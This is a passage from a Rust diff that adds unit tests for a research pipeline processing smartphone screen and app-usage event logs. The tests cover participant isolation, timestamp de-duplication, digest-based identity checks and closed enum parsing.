+        for strategy in ScreenSessionConstructionStrategyId::ALL {
+            let mut options = source_screen_options();
+            options.screen_session_construction_strategy = strategy;
+            options.screen_session_construction_strategy_explicit =
+                strategy != ScreenSessionConstructionStrategyId::ChronicleScreenInteractiveV1;
+            let sidecar = b05_capable_sidecar(B05_IDENTITY_TEST_RAW, strategy);
+            let result = run_pipeline_v2_with_supports(
+                B05_IDENTITY_TEST_RAW,
+                &options,
+                PipelineV2SupportFiles {
+                    input_capability_evidence_csv: &sidecar,
+                    ..PipelineV2SupportFiles::default()
+                },
+            )
+            .expect("screen strategy output");
+            let csv = String::from_utf8(result.screen_csv_bytes.to_vec()).unwrap();
+            assert_eq!(
+                csv.lines()
+                    .next()
+                    .unwrap()
+                    .split(',')
+                    .map(str::to_owned)
+                    .collect::<Vec<_>>(),
+                declared_screen_output_columns_for_strategy(strategy),
+                "{}",
+                strategy.canonical_id(),
+            );
+        }
+    }
+
+    #[test]
+    fn chronicle_screen_receipt_preserves_participant_isolation_orphans_and_empty_input() {
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 09:59:00,UTC\n",
+            "Study,P01,Child,,Screen Interactive,android,2026-03-07 10:00:00,UTC\n",
+            "Study,P02,Child,,Screen Interactive,android,2026-03-07 10:00:01,UTC\n",
+            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:00:02,UTC\n",
+            "Study,P02,Child,,Screen Non-Interactive,android,2026-03-07 10:00:03,UTC\n",
+        )
+        .as_bytes();
+        let mut options = test_options();
+        options.usage_session_mode = UsageSessionMode::ScreenUsage;
+        options.include_app_output = false;
+        options.include_screen_output = true;
+        let result =
+            run_pipeline_v2_with_supports(raw, &options, PipelineV2SupportFiles::default())
+                .expect("participant-partitioned Chronicle screen run");
+        let screen = result.b05_schoedel_preflight.screen_construction.unwrap();
+        assert_eq!(
+            screen
+                .intervals
+                .iter()
+                .map(|interval| (
+                    interval.participant_id.as_str(),
+                    interval.start_ns,
+                    interval.stop_ns,
+                ))
+                .collect::<Vec<_>>(),
+            vec![
+                (
+                    "P01",
+                    1_772_877_600_000_000_000,
+                    Some(1_772_877_602_000_000_000),
+                ),
+                (
+                    "P02",
+                    1_772_877_601_000_000_000,
+                    Some(1_772_877_603_000_000_000),
+                ),
+            ],
+        );
+        assert_eq!(
+            screen
+                .construction_receipt
+                .as_ref()
+                .unwrap()
+                .issue_counts
+                .get("chronicle_orphan_stop"),
+            Some(&1),
+        );
+        assert_eq!(screen.issues[0].source_data_row, 1);
+
+        let header_only = b"study_id,participant_id,interaction_type,event_timestamp\n";
+        let empty =
+            run_pipeline_v2_with_supports(header_only, &options, PipelineV2SupportFiles::default())
+                .expect("empty Chronicle screen run");
+        let receipt = empty
+            .b05_schoedel_preflight
+            .screen_construction
+            .unwrap()
+            .construction_receipt
+            .unwrap();
+        assert_eq!((receipt.participant_count, receipt.interval_count), (0, 0));
+    }
+
+    #[test]
+    fn canonical_participant_state_isolation_matches_independent_runs() {
+        let p1 = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,,Screen Interactive/Keyguard Shown,android,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,,Keyguard Hidden,android,2026-03-07 10:00:01,UTC\n",
+            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:03:20,UTC\n",
+        );
+        let combined = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,,Screen Interactive/Keyguard Shown,android,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,,Keyguard Hidden,android,2026-03-07 10:00:01,UTC\n",
+            "Study,P02,Child,,Keyguard Shown,com.amazon.firelauncher,2026-03-07 10:03:15,UTC\n",
+            "Study,P01,Child,,Screen Non-Interactive,android,2026-03-07 10:03:20,UTC\n",
+        );
+        let mut options = test_options();
+        options.timezone = "UTC".into();
+        options.usage_session_mode = UsageSessionMode::ScreenUsage;
+        options.include_app_output = false;
+        options.include_screen_output = true;
+        options.screen_auto_lock_timeout_seconds = 120.0;
+        options.screen_auto_lock_tolerance_seconds = 30.0;
+        options.screen_manual_lock_max_tail_seconds = 5.0;
+        options.screen_keyguard_near_stop_seconds = 10.0;
+        let isolated = run_pipeline_v2_with_supports(
+            p1.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("P01-only run");
+        let interleaved = run_pipeline_v2_with_supports(
+            combined.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("interleaved run");
+        assert_eq!(isolated.screen_csv_bytes, interleaved.screen_csv_bytes);
+        let csv = String::from_utf8(interleaved.screen_csv_bytes.to_vec()).unwrap();
+        assert!(csv.contains("Android"));
+        assert!(!csv.contains("Amazon Fire"));
+        assert!(csv.contains("extended_idle_or_unknown"));
+        assert!(!csv.contains("probable_manual_lock"));
+    }
+
+    #[test]
+    fn duplicate_gap_and_engagement_state_are_participant_partitioned() {
+        let mut combined = rows_from_participant_events(&[
+            ("P01", "2026-03-07 10:00:00", "Activity Resumed", "app.a"),
+            ("P02", "2026-03-07 10:00:00", "Activity Resumed", "app.x"),
+            ("P01", "2026-03-07 10:00:00", "Activity Paused", "app.a"),
+            ("P02", "2026-03-07 10:01:00", "Activity Paused", "app.x"),
+        ]);
+        assert_eq!(count_duplicate_groups(&combined), 1);
+        let p1 = combined
+            .iter()
+            .filter(|row| row.participant_id == "P01")
+            .cloned()
+            .collect::<Vec<_>>();
+        let p2 = combined
+            .iter()
+            .filter(|row| row.participant_id == "P02")
+            .cloned()
+            .collect::<Vec<_>>();
+        let corrected = unalign_duplicate_timestamps(
+            combined.clone(),
+            &["Activity Paused".into()],
+            &["Activity Resumed".into()],
+        )
+        .expect("duplicate-timestamp adjustment stays representable");
+        let corrected_p1 = unalign_duplicate_timestamps(
+            p1.clone(),
+            &["Activity Paused".into()],
+            &["Activity Resumed".into()],
+        )
+        .expect("duplicate-timestamp adjustment stays representable");
+        let corrected_p2 = unalign_duplicate_timestamps(
+            p2.clone(),
+            &["Activity Paused".into()],
+            &["Activity Resumed".into()],
+        )
+        .expect("duplicate-timestamp adjustment stays representable");
+        for (participant, independent) in [("P01", corrected_p1), ("P02", corrected_p2)] {
+            assert_eq!(
+                corrected
+                    .iter()
+                    .filter(|row| row.participant_id == participant)
+                    .map(|row| row.event_timestamp_ns)
+                    .collect::<Vec<_>>(),
+                independent
+                    .iter()
+                    .map(|row| row.event_timestamp_ns)
+                    .collect::<Vec<_>>(),
+            );
+        }
+
+        combined = derive_time_gap_evidence(combined);
+        let p1 = derive_time_gap_evidence(p1);
+        let p2 = derive_time_gap_evidence(p2);
+        for (participant, independent) in [("P01", p1), ("P02", p2)] {
+            assert_eq!(
+                combined
+                    .iter()
+                    .filter(|row| row.participant_id == participant)
+                    .map(|row| row.data_time_gap_hours.to_bits())
+                    .collect::<Vec<_>>(),
+                independent
+                    .iter()
+                    .map(|row| row.data_time_gap_hours.to_bits())
+                    .collect::<Vec<_>>(),
+            );
+        }
+
+        let mut usage = rows_from_participant_events(&[
+            ("P01", "2026-03-07 10:00:00", "Activity Resumed", "app.a"),
+            ("P02", "2026-03-07 10:00:05", "Activity Resumed", "app.b"),
+            ("P01", "2026-03-07 10:00:20", "Activity Resumed", "app.b"),
+        ]);
+        for row in &mut usage {
+            let start = row.event_timestamp_ns;
+            let data = row.edit_all();
+            data.interaction_type = APP_USAGE.into();
+            data.start_timestamp_ns = Some(start);
+            data.stop_timestamp_ns = Some(start + 10_000_000_000);
+        }
+        let mut p1_usage = usage
+            .iter()
+            .filter(|row| row.participant_id == "P01")
+            .cloned()
+            .collect::<Vec<_>>();
+        add_app_usage_detail_columns(&mut usage, 300.0);
+        add_app_usage_detail_columns(&mut p1_usage, 300.0);
+        assert_eq!(
+            usage
+                .iter()
+                .filter(|row| row.participant_id == "P01")
+                .map(|row| (
+                    row.any_app_new_engage_30s,
+                    row.any_app_switched_app,
+                    row.any_app_usage_time_gap_hours.to_bits(),
+                ))
+                .collect::<Vec<_>>(),
+            p1_usage
+                .iter()
+                .map(|row| (
+                    row.any_app_new_engage_30s,
+                    row.any_app_switched_app,
+                    row.any_app_usage_time_gap_hours.to_bits(),
+                ))
+                .collect::<Vec<_>>(),
+        );
+    }
+
+    #[test]
+    fn chronicle_adapter_projects_device_shutdown_close_reason() {
+        let rows = rows_from_events(&[("2026-03-07 10:00:00", "Screen Interactive", "android")]);
+        let start = &rows[0];
+        let close = ScreenSessionClose {
+            state: ScreenState {
+                start_index: 0,
+                start_timestamp_ns: start.event_timestamp_ns,
+                start_timezone: start.timezone.clone(),
+                start_source_data_rows: start.source_data_rows.clone(),
+                lock_screen_seen: false,
+                unlocked_seen: false,
+                foreground_pkg: None,
+                app_observed: Some(false),
+                last_meaningful_ts_ns: None,
+                last_meaningful_pkg: None,
+                source_data_rows: start.source_data_rows.clone(),
+            },
+            stop_timestamp_ns: Some(start.event_timestamp_ns + 1),
+            stop_event_type: Some("Device Shutdown".into()),
+            stop_index: None,
+            stop_source_data_rows: SourceDataRows::single(2),
+        };
+        let interval_inputs = chronicle_interval_inputs(&rows, &[close]);
+        assert_eq!(
+            interval_inputs[0].close_reason,
+            b05::ScreenIntervalCloseReason::DeviceShutdown,
+        );
+        assert_eq!(interval_inputs[0].start_boundary_source_row, 1);
+        assert_eq!(interval_inputs[0].stop_boundary_source_row, Some(2));
+    }
+
+    #[test]
+    fn b05_assignment_id_matches_runtime_stable_id_protocol() {
+        let artifact = concat!(
+            "sha256:",
+            "0000000000000000000000000000000000000000000000000000000000000000"
+        );
+        assert_eq!(
+            b05_evidence_assignment_digest(artifact),
+            "sha256:11e098fe39bcedaffc0f8d5cb6e3dc5629b0aa88d78e4b53954c904c330207c7",
+        );
+    }
+
+    #[test]
+    fn b05_verified_identity_mismatches_are_typed_and_phi_safe() {
+        let options = source_screen_options();
+        let sidecar = b05_capable_sidecar(
+            B05_IDENTITY_TEST_RAW,
+            options.screen_session_construction_strategy,
+        );
+        let artifact_digest = sha256_wire(&sidecar);
+        let assignment_digest = b05_evidence_assignment_digest(&artifact_digest);
+        let wrong = concat!(
+            "sha256:",
+            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
+        );
+
+        let artifact_error = match prepare_b05_schoedel(
+            B05_IDENTITY_TEST_RAW,
+            &options,
+            &sidecar,
+            B05PreflightIdentity {
+                verified_evidence_artifact_digest: Some(wrong),
+                ..B05PreflightIdentity::default()
+            },
+        ) {
+            Err(error) => error,
+            Ok(_) => panic!("artifact disagreement must fail"),
+        };
+        assert!(matches!(
+            artifact_error,
+            B05PreflightError::EvidenceArtifactDigestMismatch
+        ));
+        assert_eq!(
+            artifact_error.to_string(),
+            "b05_preflight_identity_error:evidence_artifact_digest_mismatch"
+        );
+
+        let assignment_error = match prepare_b05_schoedel(
+            B05_IDENTITY_TEST_RAW,
+            &options,
+            &sidecar,
+            B05PreflightIdentity {
+                verified_evidence_artifact_digest: Some(&artifact_digest),
+                verified_evidence_assignment_digest: Some(wrong),
+                ..B05PreflightIdentity::default()
+            },
+        ) {
+            Err(error) => error,
+            Ok(_) => panic!("assignment disagreement must fail"),
+        };
+        assert!(matches!(
+            assignment_error,
+            B05PreflightError::EvidenceAssignmentDigestMismatch
+        ));
+        assert_eq!(
+            assignment_error.to_string(),
+            "b05_preflight_identity_error:evidence_assignment_digest_mismatch"
+        );
+
+        let prepared = prepare_b05_schoedel(
+            B05_IDENTITY_TEST_RAW,
+            &options,
+            &sidecar,
+            B05PreflightIdentity {
+                verified_request_options_digest: Some(&artifact_digest),
+                verified_evidence_artifact_digest: Some(&artifact_digest),
+                verified_evidence_assignment_digest: Some(&assignment_digest),
+            },
+        )
+        .expect("matching identities prepare");
+        assert_eq!(
+            validate_prepared_b05_schoedel(
+                B05_IDENTITY_TEST_RAW,
+                &options,
+                &sidecar,
+                B05PreflightIdentity {
+                    verified_request_options_digest: Some(wrong),
+                    verified_evidence_artifact_digest: Some(&artifact_digest),
+                    verified_evidence_assignment_digest: Some(&assignment_digest),
+                },
+                &prepared,
+            ),
+            Err(B05PreparedExecutionError::RequestOptionsDigestMismatch),
+        );
+        assert_eq!(
+            validate_prepared_b05_schoedel(
+                B05_IDENTITY_TEST_RAW,
+                &options,
+                &sidecar,
+                B05PreflightIdentity::default(),
+                &prepared,
+            ),
+            Err(B05PreparedExecutionError::RequestOptionsDigestMismatch),
+            "verified request identity may not disappear at execution",
+        );
+        assert_eq!(
+            validate_prepared_b05_schoedel(
+                B05_IDENTITY_TEST_RAW,
+                &options,
+                &sidecar,
+                B05PreflightIdentity {
+                    verified_request_options_digest: Some(&artifact_digest),
+                    verified_evidence_artifact_digest: None,
+                    verified_evidence_assignment_digest: Some(&assignment_digest),
+                },
+                &prepared,
+            ),
+            Err(B05PreparedExecutionError::EvidenceArtifactDigestMismatch),
+            "verified artifact identity may not disappear at execution",
+        );
+        assert_eq!(
+            validate_prepared_b05_schoedel(
+                B05_IDENTITY_TEST_RAW,
+                &options,
+                &sidecar,
+                B05PreflightIdentity {
+                    verified_request_options_digest: Some(&artifact_digest),
+                    verified_evidence_artifact_digest: Some(&artifact_digest),
+                    verified_evidence_assignment_digest: None,
+                },
+                &prepared,
+            ),
+            Err(B05PreparedExecutionError::EvidenceAssignmentDigestMismatch),
+            "verified assignment identity may not disappear at execution",
+        );
+        let mut inactive = options.clone();
+        inactive.usage_session_mode = UsageSessionMode::NoUsage;
+        assert_eq!(
+            validate_prepared_b05_schoedel(
+                B05_IDENTITY_TEST_RAW,
+                &inactive,
+                &sidecar,
+                B05PreflightIdentity {
+                    verified_request_options_digest: Some(&artifact_digest),
+                    verified_evidence_artifact_digest: Some(&artifact_digest),
+                    verified_evidence_assignment_digest: Some(&assignment_digest),
+                },
+                &prepared,
+            ),
+            Err(B05PreparedExecutionError::ComponentOptionsDigestMismatch),
+            "an active prepared object cannot cross into an inactive usage mode",
+        );
+    }
+
+    #[test]
+    fn b05_inactive_and_chronicle_paths_do_not_read_or_bind_sidecar() {
+        let malformed = b"definitely not a capability CSV";
+        let mut inactive = test_options();
+        inactive.usage_session_mode = UsageSessionMode::AppUsage;
+        let inactive = prepare_b05_schoedel(
+            B05_IDENTITY_TEST_RAW,
+            &inactive,
+            malformed,
+            B05PreflightIdentity {
+                verified_evidence_artifact_digest: Some("also ignored"),
+                verified_evidence_assignment_digest: Some("also ignored"),
+                ..B05PreflightIdentity::default()
+            },
+        )
+        .expect("inactive B05 ignores sidecar");
+        assert_eq!(
+            inactive.evidence().disposition,
+            ScientificPreflightDisposition::NotApplicable
+        );
+        assert!(inactive.evidence_artifact_digest.is_none());
+
+        let mut chronicle = test_options();
+        chronicle.usage_session_mode = UsageSessionMode::ScreenUsage;
+        let chronicle = prepare_b05_schoedel(
+            B05_IDENTITY_TEST_RAW,
+            &chronicle,
+            malformed,
+            B05PreflightIdentity {
+                verified_evidence_artifact_digest: Some("also ignored"),
+                verified_evidence_assignment_digest: Some("also ignored"),
+                ..B05PreflightIdentity::default()
+            },
+        )
+        .expect("Chronicle baseline ignores sidecar");
+        assert_eq!(
+            chronicle.evidence().disposition,
+            ScientificPreflightDisposition::Executable
+        );
+        assert!(chronicle.evidence_artifact_digest.is_none());
+        assert_eq!(
+            chronicle.evidence().screen_construction_phase,
+            B05ComputationPhase::DeferredCanonicalBaseline
+        );
+        assert!(chronicle.evidence().screen_construction.is_none());
+    }
+
+    #[test]
+    fn b05_component_and_verified_request_digest_origins_are_distinct() {
+        let mut options = test_options();
+        options.usage_session_mode = UsageSessionMode::ScreenUsage;
+        let direct = prepare_b05_schoedel(
+            B05_IDENTITY_TEST_RAW,
+            &options,
+            &[],
+            B05PreflightIdentity::default(),
+        )
+        .expect("direct preparation");
+        assert_eq!(
+            direct.evidence().options_digest_origin,
+            B05OptionsDigestOrigin::KernelRouterComponent
+        );
+        assert_eq!(
+            direct.evidence().options_digest,
+            direct.evidence().component_options_digest
+        );
+
+        let verified_digest = concat!(
+            "sha256:",
+            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+        );
+        let verified = prepare_b05_schoedel(
+            B05_IDENTITY_TEST_RAW,
+            &options,
+            &[],
+            B05PreflightIdentity {
+                verified_request_options_digest: Some(verified_digest),
+                ..B05PreflightIdentity::default()
+            },
+        )
+        .expect("verified preparation");
+        assert_eq!(
+            verified.evidence().options_digest_origin,
+            B05OptionsDigestOrigin::VerifiedRequestJcs
+        );
+        assert_eq!(verified.evidence().options_digest, verified_digest);
+        assert_ne!(
+            verified.evidence().options_digest,
+            verified.evidence().component_options_digest
+        );
+    }
+
+    #[test]
+    fn foundational_component_identities_have_stage_scoped_influence() {
+        let base = schoedel_options();
+        let mut b01 = base.clone();
+        b01.event_retention_set = EventRetentionSet::ForegroundBackgroundOnly;
+        assert_eq!(
+            b05_router_options_digest(&base),
+            b05_router_options_digest(&b01),
+            "B01 is not a router input",
+        );
+        assert_eq!(
+            b05_screen_options_digest(&base),
+            b05_screen_options_digest(&b01),
+            "B01 must not invalidate raw/source or canonical B05",
+        );
+        assert_ne!(
+            schoedel_options_digest(&base),
+            schoedel_options_digest(&b01)
+        );
+
+        let mut explicit = base.clone();
+        explicit.screen_session_construction_strategy_explicit = true;
+        assert_ne!(
+            b05_router_options_digest(&base),
+            b05_router_options_digest(&explicit),
+            "explicit selection changes the receipt relation",
+        );
+        assert_eq!(
+            b05_screen_options_digest(&base),
+            b05_screen_options_digest(&explicit),
+            "explicit selection does not rerun the state machine",
+        );
+        assert_eq!(
+            schoedel_options_digest(&base),
+            schoedel_options_digest(&explicit),
+        );
+
+        let prepared = prepare_b05_schoedel(
+            B05_IDENTITY_TEST_RAW,
+            &base,
+            &[],
+            B05PreflightIdentity::default(),
+        )
+        .expect("prepared base");
+        assert_eq!(
+            validate_prepared_b05_schoedel(
+                B05_IDENTITY_TEST_RAW,
+                &b01,
+                &[],
+                B05PreflightIdentity::default(),
+                &prepared,
+            ),
+            Err(B05PreparedExecutionError::SchoedelComponentOptionsDigestMismatch),
+        );
+    }
+
+    #[test]
+    fn prepared_screen_substrate_rebinds_router_and_schoedel_without_replay() {
+        B05_PREPARE_DECODE_COUNT.with(|count| count.set(0));
+        B05_PREPARE_EVIDENCE_PARSE_COUNT.with(|count| count.set(0));
+        B05_SCREEN_CONSTRUCTION_COUNT.with(|count| count.set(0));
+
+        let mut base = schoedel_options();
+        base.screen_session_construction_strategy =
+            ScreenSessionConstructionStrategyId::ParryToth2025SessionGlanceV1;
+        base.screen_session_construction_strategy_explicit = false;
+        let sidecar = b05_capable_sidecar(
+            SCHOEDEL_PIPELINE_RAW,
+            base.screen_session_construction_strategy,
+        );
+        let raw_digest = sha256_wire(SCHOEDEL_PIPELINE_RAW);
+        let prepared = prepare_b05_schoedel(
+            SCHOEDEL_PIPELINE_RAW,
+            &base,
+            &sidecar,
+            B05PreflightIdentity::default(),
+        )
+        .expect("initial source substrate");
+        let initial_screen = prepared
+            .evidence()
+            .screen_construction
+            .as_ref()
+            .expect("source screen output");
+        let initial_interval_ids = initial_screen
+            .intervals
+            .iter()
+            .map(|interval| interval.screen_interval_id.clone())
+            .collect::<Vec<_>>();
+
+        let mut b01 = base.clone();
+        b01.event_retention_set = EventRetentionSet::ForegroundBackgroundOnly;
+        let rebound_b01 = rebind_b05_schoedel_prepared(
+            &prepared,
+            &b01,
+            &raw_digest,
+            B05PreflightIdentity::default(),
+        )
+        .expect("B01 rebind");
+        assert_ne!(
+            prepared.evidence().schoedel_component_options_digest,
+            rebound_b01.evidence().schoedel_component_options_digest,
+        );
+
+        let mut b02 = base.clone();
+        b02.opener_set = OpenerSet::GesisAppScopedStarts;
+        rebind_b05_schoedel_prepared(
+            &prepared,
+            &b02,
+            &raw_digest,
+            B05PreflightIdentity::default(),
+        )
+        .expect("B02 rebind");
+
+        let mut explicit = base.clone();
+        explicit.screen_session_construction_strategy_explicit = true;
+        let rebound_explicit = rebind_b05_schoedel_prepared(
+            &prepared,
+            &explicit,
+            &raw_digest,
+            B05PreflightIdentity::default(),
+        )
+        .expect("selection-relation rebind");
+        assert_ne!(
+            prepared.evidence().component_options_digest,
+            rebound_explicit.evidence().component_options_digest,
+        );
+        assert_eq!(
+            initial_interval_ids,
+            rebound_explicit
+                .evidence()
+                .screen_construction
+                .as_ref()
+                .expect("rebound screen output")
+                .intervals
+                .iter()
+                .map(|interval| interval.screen_interval_id.clone())
+                .collect::<Vec<_>>(),
+        );
+        assert_eq!(B05_PREPARE_DECODE_COUNT.with(Cell::get), 1);
+        assert_eq!(B05_PREPARE_EVIDENCE_PARSE_COUNT.with(Cell::get), 1);
+        assert_eq!(B05_SCREEN_CONSTRUCTION_COUNT.with(Cell::get), 1);
+
+        let mut inactive = base.clone();
+        inactive.usage_session_mode = UsageSessionMode::NoUsage;
+        let rebound_inactive = rebind_b05_schoedel_prepared(
+            &prepared,
+            &inactive,
+            &raw_digest,
+            B05PreflightIdentity::default(),
+        )
+        .expect("inactive router rebind");
+        assert_eq!(
+            rebound_inactive.evidence().disposition,
+            ScientificPreflightDisposition::NotApplicable,
+        );
+        assert!(rebound_inactive.evidence().screen_construction.is_none());
+        let rebound_active = rebind_b05_schoedel_prepared(
+            &rebound_inactive,
+            &base,
+            &raw_digest,
+            B05PreflightIdentity::default(),
+        )
+        .expect("chained active rebind retains neutral source construction");
+        assert_eq!(
+            prepared.evidence().screen_construction,
+            rebound_active.evidence().screen_construction,
+        );
+        assert_eq!(B05_PREPARE_DECODE_COUNT.with(Cell::get), 1);
+        assert_eq!(B05_PREPARE_EVIDENCE_PARSE_COUNT.with(Cell::get), 1);
+        assert_eq!(B05_SCREEN_CONSTRUCTION_COUNT.with(Cell::get), 1);
+
+        let mut other_strategy = base.clone();
+        other_strategy.screen_session_construction_strategy =
+            ScreenSessionConstructionStrategyId::Zhu2018UnlockLockV1;
+        assert!(matches!(
+            rebind_b05_schoedel_prepared(
+                &prepared,
+                &other_strategy,
+                &raw_digest,
+                B05PreflightIdentity::default(),
+            ),
+            Err(B05PreflightError::ScreenSubstrateOptionsMismatch),
+        ));
+    }
+
+    #[test]
+    fn deferred_schoedel_preflight_exposes_requested_and_effective_episode_ids() {
+        let prepared = prepare_b05_schoedel(
+            SCHOEDEL_PIPELINE_RAW,
+            &schoedel_options(),
+            &[],
+            B05PreflightIdentity::default(),
+        )
+        .expect("deferred Schoedel preflight");
+        assert_eq!(
+            prepared.evidence().requested_episode_strategy_id,
+            "schoedel_2026_app_within_screen_prose_v1",
+        );
+        assert_eq!(
+            prepared.evidence().effective_episode_strategy_id.as_deref(),
+            Some("schoedel_2026_app_within_screen_prose_v1"),
+        );
+        assert_eq!(
+            prepared.evidence().schoedel_reconstruction_phase,
+            B05ComputationPhase::DeferredRetainedAppStream,
+        );
+    }
+
+    #[test]
+    fn prepared_b05_is_consumed_without_second_decode_or_sidecar_parse() {
+        B05_PREPARE_DECODE_COUNT.with(|count| count.set(0));
+        B05_PREPARE_EVIDENCE_PARSE_COUNT.with(|count| count.set(0));
+        let options = source_screen_options();
+        let sidecar = b05_capable_sidecar(
+            B05_IDENTITY_TEST_RAW,
+            options.screen_session_construction_strategy,
+        );
+        let prepared = prepare_b05_schoedel(
+            B05_IDENTITY_TEST_RAW,
+            &options,
+            &sidecar,
+            B05PreflightIdentity::default(),
+        )
+        .expect("source preparation");
+        assert_eq!(B05_PREPARE_DECODE_COUNT.with(Cell::get), 1);
+        assert_eq!(B05_PREPARE_EVIDENCE_PARSE_COUNT.with(Cell::get), 1);
+        run_pipeline_v2_with_prepared_b05(
+            B05_IDENTITY_TEST_RAW,
+            &options,
+            PipelineV2SupportFiles {
+                input_capability_evidence_csv: &sidecar,
+                ..PipelineV2SupportFiles::default()
+            },
+            prepared,
+        )
+        .expect("prepared execution");
+        assert_eq!(B05_PREPARE_DECODE_COUNT.with(Cell::get), 1);
+        assert_eq!(B05_PREPARE_EVIDENCE_PARSE_COUNT.with(Cell::get), 1);
+    }
+
+    #[test]
+    fn a_prepared_b05_from_other_bytes_is_refused_and_shared_digest_receipts_equal_the_public_ones() {
+        let options = source_screen_options();
+        let sidecar = b05_capable_sidecar(
+            B05_IDENTITY_TEST_RAW,
+            options.screen_session_construction_strategy,
+        );
+        let support = PipelineV2SupportFiles {
+            input_capability_evidence_csv: &sidecar,
+            ..PipelineV2SupportFiles::default()
+        };
+        let prepared = prepare_b05_schoedel(
+            B05_IDENTITY_TEST_RAW,
+            &options,
+            &sidecar,
+            B05PreflightIdentity::default(),
+        )
+        .expect("source preparation");
+        let mut other_bytes = B05_IDENTITY_TEST_RAW.to_vec();
+        other_bytes.push(b'\n');
+        let Err(error) =
+            run_pipeline_v2_with_prepared_b05(&other_bytes, &options, support, prepared)
+        else {
+            panic!("a prepared object from other bytes must be refused");
+        };
+        assert_eq!(error, "b05_prepared_execution_error:raw_input_digest_mismatch");
+
+        // The shared-digest paths must produce exactly what the public,
+        // self-hashing entry points produce for the same bytes.
+        let expected = sha256_wire(B05_IDENTITY_TEST_RAW);
+        let public_prepared = prepare_b05_schoedel_with_input_boundary(
+            B05_IDENTITY_TEST_RAW,
+            &options,
+            &sidecar,
+            b05_identity_from_support(support),
+            participant_input_boundary_from_support(support),
+        )
+        .expect("public preparation");
+        let public_eyes = preflight_eyes_complement_input_partition(
+            B05_IDENTITY_TEST_RAW,
+            &options,
+            eyes_input_partition_identity_from_support(support),
+            participant_input_boundary_from_support(support),
+        )
+        .expect("public EYES preflight");
+        assert_eq!(public_prepared.raw_input_sha256, expected);
+        assert_eq!(public_eyes.input_digest, expected);
+
+        let run = prepare_sequential_run(B05_IDENTITY_TEST_RAW, &options, support)
+            .expect("sequential preparation");
+        assert_eq!(run.prepared.raw_input_sha256, expected);
+        assert_eq!(run.prepared.evidence(), public_prepared.evidence());
+        if let Some(eyes) = &run.eyes_input_partition_preflight {
+            assert_eq!(eyes, &public_eyes);
+        }
+        let (_, eyes) = sequential_scientific_preflight(B05_IDENTITY_TEST_RAW, &options, support)
+            .expect("sequential preflight");
+        assert_eq!(eyes, public_eyes);
+    }
+
+    #[test]
+    fn foundational_semantics_axes_are_closed_round_trippable_and_unknown_safe() {
+        assert_eq!(MicroUseClassificationPolicy::ALL.len(), 2);
+        assert_eq!(
+            MicroUseClassificationPolicy::default(),
+            MicroUseClassificationPolicy::None
+        );
+        for policy in MicroUseClassificationPolicy::ALL {
+            assert_eq!(
+                MicroUseClassificationPolicy::from_canonical_id(policy.canonical_id()),
+                policy,
+            );
+        }
+        assert!(
+            MicroUseClassificationPolicy::parse_request_value("future_micro_policy")
+                .expect_err("an unknown micro_use_classification_policy is refused")
+                .starts_with("unknown_micro_use_classification_policy: "),
+        );
+
+        assert_eq!(MinimumDurationComparator::ALL.len(), 2);
+        assert_eq!(
+            MinimumDurationComparator::default(),
+            MinimumDurationComparator::StrictLt,
+        );
+        for comparator in MinimumDurationComparator::ALL {
+            assert_eq!(
+                MinimumDurationComparator::from_canonical_id(comparator.canonical_id()),
+                comparator,
+            );
+        }
+        assert!(
+            MinimumDurationComparator::parse_request_value("future_comparator")
+                .expect_err("an unknown minimum_duration_comparator is refused")
+                .starts_with("unknown_minimum_duration_comparator: "),
+        );
+
+        assert_eq!(MinimumDurationDisposition::ALL.len(), 4);
+        assert_eq!(
+            MinimumDurationDisposition::default(),
+            MinimumDurationDisposition::ChronicleBlankKeepRow,
+        );
+        for disposition in MinimumDurationDisposition::ALL {
+            assert_eq!(
+                MinimumDurationDisposition::from_canonical_id(disposition.canonical_id()),
+                disposition,
+            );
+        }
+        assert!(
+            MinimumDurationDisposition::parse_request_value("future_disposition")
+                .expect_err("an unknown minimum_duration_disposition is refused")
+                .starts_with("unknown_minimum_duration_disposition: "),
+        );
+    }
+
+    #[test]
+    fn opener_set_is_closed_round_trippable_and_unknown_safe() {
+        assert_eq!(OpenerSet::ALL.len(), 3);
+        assert_eq!(OpenerSet::default(), OpenerSet::StrategyDefined);
+        for opener_set in OpenerSet::ALL {
+            assert_eq!(
+                OpenerSet::from_canonical_id(opener_set.canonical_id()),
+                opener_set
+            );
+        }
+        assert!(
+            OpenerSet::parse_request_value("future_narrow_arm")
+                .expect_err("an unknown opener_set is refused")
+                .starts_with("unknown_opener_set: "),
+        );
+    }
+
+    #[test]
+    fn opener_applicability_exhausts_the_eight_by_three_matrix() {
+        use OpenerStrategyRelation as Relation;
+        let expected = [
+            // strategy_defined
+            [Relation::BaselineNative; 8],
+            // activity_resumed_only, in EpisodeReconstructionStrategy::ALL order
+            [
+                Relation::BaselineEquivalent,
+                Relation::SourceEquivalent,
+                Relation::SourceEquivalent,
+                Relation::ControlledDerivative,
+                Relation::SourceEquivalent,
+                Relation::SourceEquivalent,
+                Relation::SourceEquivalent,
+                Relation::SourceEquivalent,
+            ],
+            // gesis_app_scoped_starts
+            [
+                Relation::ControlledDerivative,
+                Relation::ControlledDerivative,
+                Relation::Refused,
+                Relation::SourceAlignedAdapter,
+                Relation::ControlledDerivative,
+                Relation::ControlledDerivative,
+                Relation::ControlledDerivative,
+                Relation::ControlledDerivative,
+            ],
+        ];
+        for (opener_index, opener_set) in OpenerSet::ALL.into_iter().enumerate() {
+            for (strategy_index, &strategy) in EpisodeReconstructionStrategy::ALL.iter().enumerate()
+            {
+                let applicability = opener_set.applicability(strategy);
+                assert_eq!(
+                    applicability.relation,
+                    expected[opener_index][strategy_index],
+                    "{} × {}",
+                    opener_set.canonical_id(),
